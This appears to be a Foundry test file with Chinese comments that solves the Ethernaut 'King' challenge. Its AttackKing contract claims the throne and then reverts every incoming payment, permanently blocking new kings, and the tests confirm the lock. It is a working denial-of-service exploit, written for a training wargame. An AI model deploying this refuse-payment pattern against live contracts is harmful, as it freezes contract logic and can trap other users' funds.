// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../../src/ethernaut/King.sol"; 

contract AttackKing {
    King public kingContract;

    constructor(address _kingContract) {
        kingContract = King(_kingContract);
    }

    // 发送以太坊，成为 King
    function attack() external payable {
        (bool success, ) = address(kingContract).call{value: msg.value}("");
        require(success, "Attack failed");
    }

    // 阻止接收 ETH，导致 King 合约失败
    receive() external payable {
        revert("I won't accept funds!");
    }
}

contract KingTest is Test {
    King king;
    AttackKing attackKing;

    // 设置测试环境
    function setUp() public {
        // 部署 King 合约，初始发送 1 ETH
        king = new King{value: 1 ether}();
    }

    // 测试 King 的正常操作
    function testNormalKing() public {
        // 确保合约创建者是 King
        assertEq(king._king(), address(this));

        // 成为新的 King
        vm.deal(address(1), 2 ether); // 为 address(1) 分配 2 ETH
        vm.prank(address(1)); // 设置 msg.sender 为 address(1)
        (bool success, ) = address(king).call{value: 2 ether}("");
        assertTrue(success);
        assertEq(king._king(), address(1)); // 验证 address(1) 成为新的 King
    }

    // 测试攻击
    function testAttack() public {
        // 确保合约创建者是 King
        assertEq(king._king(), address(this));

        // 部署攻击合约
        attackKing = new AttackKing(address(king));

        // 执行攻击，成为 King
        vm.deal(address(attackKing), 2 ether); // 为攻击合约分配 2 ETH
        attackKing.attack{value: 2 ether}(); // 攻击合约成为 King

        // 验证攻击合约成为 King
        assertEq(king._king(), address(attackKing));

        // 尝试用新账户成为 King，测试攻击是否成功阻止
        vm.deal(address(1), 3 ether);
        vm.prank(address(1));
        (bool success, ) = address(king).call{value: 3 ether}("");
        assertFalse(success); // 成为 King 应该失败
        assertEq(king._king(), address(attackKing)); // 确认 King 仍然是攻击合约
    }
}
